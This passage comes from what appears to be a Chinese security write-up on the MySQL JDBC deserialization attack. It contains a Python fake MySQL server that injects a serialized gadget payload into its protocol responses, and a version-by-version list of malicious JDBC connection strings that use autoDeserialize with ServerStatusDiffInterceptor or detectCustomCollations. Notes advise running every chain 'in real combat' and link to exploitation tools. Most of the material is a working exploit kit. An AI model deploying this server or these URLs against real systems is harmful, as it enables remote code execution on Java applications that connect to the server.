 37
 38     while 1:
 39         conn, addr = sk.accept()
 40         print("Connection come from {}:{}".format(addr[0],addr[1
]))
 41
 42         # 1.先发送第⼀个 问候报⽂
 43         send_data(conn,greeting_data)
 44
 45         while True:
 46             # 登录认证过程模拟  1.客户端发送request login报⽂ 2.服务端
响应response_ok
15
 47             receive_data(conn)
 48             send_data(conn,response_ok_data)
 49
 50             #其他过程
 51             data=receive_data(conn)
 52             #查询⼀些配置信息,其中会发送⾃⼰的 版本号
 53             if "session.auto_increment_increment" in data:
 54                 _payload='01000001132e00000203646566000000186175
746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0
000000002a00000303646566000000146368617261637465725f7365745f636c
69656e74000c21000c000000fd00001f00002e00000403646566000000186368
617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00
001f00002b00000503646566000000156368617261637465725f7365745f7265
73756c7473000c21000c000000fd00001f00002a000006036465660000001463
68617261637465725f7365745f736572766572000c210012000000fd00001f00
00260000070364656600000010636f6c6c6174696f6e5f736572766572000c21
0033000000fd00001f000022000008036465660000000c696e69745f636f6e6e
656374000c210000000000fd00001f0000290000090364656600000013696e74
65726163746976655f74696d656f7574000c3f001500000008a0000000001d00
000a03646566000000076c6963656e7365000c210009000000fd00001f00002c
00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d65
73000c3f001500000008a0000000002800000c03646566000000126d61785f61
6c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03
646566000000116e65745f77726974655f74696d656f7574000c3f0015000000
08a0000000002600000e036465660000001071756572795f63616368655f7369
7a65000c3f001500000008a0000000002600000f036465660000001071756572
795f63616368655f74797065000c210009000000fd00001f00001e0000100364
65660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011
036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000
fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012
000000fd00001f00002b00001303646566000000157472616e73616374696f6e
5f69736f6c6174696f6e000c21002d000000fd00001f00002200001403646566
0000000c776169745f74696d656f7574000c3f001500000008a0000000000201
00150131047574663804757466380475746638066c6174696e31116c6174696e
315f737765646973685f6369000532383830300347504c013107343139343330
340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f5550
5f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f
494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f44
49564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f55
5345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1
16
ead7bccab1bce4062b30383a30300f52455045415441424c452d524541440532
3838303007000016fe000002000000'
 55                 send_data(conn,_payload)
 56                 data=receive_data(conn)
 57             elif "show warnings" in data:
 58                 _payload = '01000001031b00000203646566000000054c
6576656c000c210015000000fd01001f00001a0000030364656600000004436f
6465000c3f000400000003a1000000001d00000403646566000000074d657373
616765000c210000060000fd01001f000059000005075761726e696e67043132
38374b27404071756572795f63616368655f73697a6527206973206465707265
636174656420616e642077696c6c2062652072656d6f76656420696e20612066
75747572652072656c656173652e59000006075761726e696e6704313238374b
27404071756572795f63616368655f7479706527206973206465707265636174
656420616e642077696c6c2062652072656d6f76656420696e20612066757475
72652072656c656173652e07000007fe000002000000'
 59                 send_data(conn, _payload)
 60                 data = receive_data(conn)
 61             if "set names" in data:
 62                 send_data(conn, response_ok_data)
 63                 data = receive_data(conn)
 64             if "set character_set_results" in data:
 65                 send_data(conn, response_ok_data)
 66                 data = receive_data(conn)
 67             if "show session status" in data:
 68                 mysql_data = '0100000102'
 69                 mysql_data += '1a0000020364656600016301630163016
30c3f00ffff0000fc9000000000'
 70                 mysql_data += '1a0000030364656600016301630163016
30c3f00ffff0000fc9000000000'
 71                 # 为什么我加了EOF Packet 就⽆法正常运⾏呢？？
 72                 //获取payload
 73                 payload_content=get_payload_content()
 74                 //计算payload⻓度
 75                 payload_length = str(hex(len(payload_content)//2
)).replace('0x', '').zfill(4)
 76                 payload_length_hex = payload_length[2:4] + paylo
ad_length[0:2]
 77                 //计算数据包⻓度
 78                 data_len = str(hex(len(payload_content)//2 + 4))
.replace('0x', '').zfill(6)
17
 79                 data_len_hex = data_len[4:6] + data_len[2:4] + d
ata_len[0:2]
 80                 mysql_data += data_len_hex + '04' + 'fbfc'+ payl
oad_length_hex
 81                 mysql_data += str(payload_content)
 82                 mysql_data += '07000005fe000022000100'
 83                 send_data(conn, mysql_data)
 84                 data = receive_data(conn)
 85             if "show warnings" in data:
 86                 payload = '01000001031b00000203646566000000054c6
576656c000c210015000000fd01001f00001a0000030364656600000004436f6
465000c3f000400000003a1000000001d00000403646566000000074d6573736
16765000c210000060000fd01001f00006d000005044e6f74650431313035625
175657279202753484f572053455353494f4e205354415455532720726577726
97474656e20746f202773656c6563742069642c6f626a2066726f6d206365736
8692e6f626a73272062792061207175657279207265777269746520706c75676
96e07000006fe000002000000'
 87                 send_data(conn, payload)
 88             break
 89
 90
 91 if __name__ == '__main__':
 92     HOST ='0.0.0.0'
 93     PORT = 3307
 94
 95     sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 96     #当socket关闭后，本地端⽤于该socket的端⼝号⽴刻就可以被重⽤.为了实验的
时候不⽤等待很⻓时间
 97     sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 98     sk.bind((HOST, PORT))
 99     sk.listen(1)
100     print("start fake mysql server listening on {}:{}".format(HO
ST,PORT))
101
102     run()
Exp
18
测试的时候把yso这个包也当做依赖加进来才能出发CC链。所以实战中最好全部跑⼀边，只要确定⽬标的
版本没问题的话。
19
 1 ServerStatusDiffInterceptor触发
 2 8.x: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryI
nterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterc
eptor&user=yso_JRE8u20_calc
 3
 4 6.x(属性名不同): jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=t
rue&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerSt
atusDiffInterceptor&user=yso_JRE8u20_calc
 5
 6 5.1.11及以上的5.x版本（包名没有了cj）: jdbc:mysql://127.0.0.1:3306/tes
t?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.inter
ceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc
 7
 8 5.1.10及以下的5.1.X版本： 同上，但是需要连接后执⾏查询。
 9
10 5.0.x: 还没有ServerStatusDiffInterceptor这个东⻄┓( ´∀` )┏
11
12 detectCustomCollations触发：
13 5.1.41及以上: 不可⽤
14
15 5.1.29-5.1.40: jdbc:mysql://127.0.0.1:3306/test?detectCustomColla
tions=true&autoDeserialize=true&user=yso_JRE8u20_calc
16
17 5.1.28-5.1.19： jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=
true&user=yso_JRE8u20_calc
18
20
可以配合Tomcat和Spring进⾏回显利⽤
https://xz.aliyun.com/t/9250
https://xz.aliyun.com/t/8159#toc-2
https://github.com/fnmsd/MySQL_Fake_Server
19 5.1.18以下的5.1.x版本： 不可⽤
20
21 5.0.x版本不可⽤
补充
资料（原⽂）